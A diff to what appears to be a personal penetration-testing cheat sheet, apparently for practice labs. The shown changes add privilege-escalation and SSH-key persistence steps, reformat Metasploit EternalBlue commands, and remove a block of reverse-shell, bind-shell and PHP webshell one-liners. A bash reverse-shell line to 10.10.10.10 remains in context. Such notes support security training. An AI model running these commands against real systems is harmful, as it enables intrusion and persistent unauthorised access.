@@ -126,6 +126,29 @@ Download and install a package
 
 > bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	Send a reverse shell from the remote server
 
+* Privilege Escalation 	
+> ./linpeas.sh 	Run linpeas script to enumerate remote server
+
+> sudo -l 	List available sudo privileges
+
+> sudo -u user /bin/echo Hello World! 	Run a command with sudo
+Always perform bash_history or PSReadLine after changing user
+
+> sudo su user - 	Switch to a user (if we have access to sudo su)
+
+* Cronjob locations  - /etc/crontab /etc/cron.d /var/spool/cron/crontabs/root
+
+* Generate SSH Keys
+> ssh private keys /home/user/.ssh/id_rsa or /root/.ssh/id_rsa
+Create a new SSH key
+> ssh-keygen -f key 	
+Add the generated public key to the user
+> echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys 	
+SSH to the server with the generated private key
+> ssh root@10.10.10.10 -i key 
+
+
+
 
 
 ## Metasploit
@@ -153,14 +176,21 @@ Download and install a package
 
 * Run scan on exploitable components 
 > searchsploit openssh 7.2 - Search for public exploits for a web application
+
 * Using MSF Console
 Start the Metasploit Framework 
 > msfconsole
+
 > search exploit eternalblue	MSF: Search for public exploits in MSF
+
 > use exploit/windows/smb/ms17_010_psexec	MSF: Start using an MSF module
+
 > show options	MSF: Show required options for an MSF module
+
 > set RHOSTS 10.10.10.40	MSF: Set a value for an MSF module option
+
 > check	MSF: Test if the target server is vulnerable
+
 > exploit	MSF: Run the exploit on the target server is vulnerable
 
 
@@ -254,29 +284,9 @@ curl 10.10.10.121/robots.txt 	List potential directories in robots.txt
 whatweb --no-errors 10.10.10.0/24
 robots.txt
 
-Using Shells 	
-nc -lvnp 1234 	Start a nc listener on a local port
-bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' 	Send a reverse shell from the remote server
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f 	/bin/sh -i 2>&1
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f 	/bin/bash -i 2>&1
-nc 10.10.10.1 1234 	Connect to a bind shell started on the remote server
-python -c 'import pty; pty.spawn("/bin/bash")' 	Upgrade shell TTY (1)
-ctrl+z then stty raw -echo then fg then enter twice 	Upgrade shell TTY (2)
-echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php 	Create a webshell php file
-curl http://SERVER_IP:PORT/shell.php?cmd=id 	Execute a command on an uploaded webshell
 
-Privilege Escalation 	
-./linpeas.sh 	Run linpeas script to enumerate remote server
-sudo -l 	List available sudo privileges
-sudo -u user /bin/echo Hello World! 	Run a command with sudo
-sudo su - 	Switch to root user (if we have access to sudo su)
-Always perform bash_history or PSReadLine after changing user
-sudo su user - 	Switch to a user (if we have access to sudo su)
-ssh private keys /home/user/.ssh/id_rsa or /root/.ssh/id_rsa
-ssh-keygen -f key 	Create a new SSH key
-echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys 	Add the generated public key to the user
-ssh root@10.10.10.10 -i key 	SSH to the server with the generated private key
-Cronjob locations  - /etc/crontab /etc/cron.d /var/spool/cron/crontabs/root
+
+
 
 
 
